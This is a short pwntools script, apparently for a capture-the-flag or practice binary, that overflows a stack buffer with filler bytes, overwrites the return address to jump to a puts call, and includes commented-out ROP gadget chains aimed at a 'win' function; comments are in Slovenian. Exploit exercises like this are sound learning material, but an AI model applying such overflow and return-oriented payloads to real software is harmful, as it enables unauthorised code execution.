from pwn import *
p = gdb.debug('./main', 'b * main')

payload = b'A' * 32 #zafilamo buffer
payload += b'B' * 8  #basePointer
payload += p64(0x402ed0) #evo skocimo na izpit puts



#payload += p64(0x40384d) #pop rdi; pop rbp; ret ta ret smo povozil z nasim gadgetom
#payload += p64(0xdeadbeef)
#payload += b'C' * 8
#tukaj se zalaufa ret kam bomo returnal?
#payload += p64(0x403b8a) #pop rsi; pop rbp; ret
#payload += p64(0xbadc0ffee)
#payload += b'D' * 8 
#payload += p64(0x402ea5) # win





p.sendline(payload)

p.interactive()
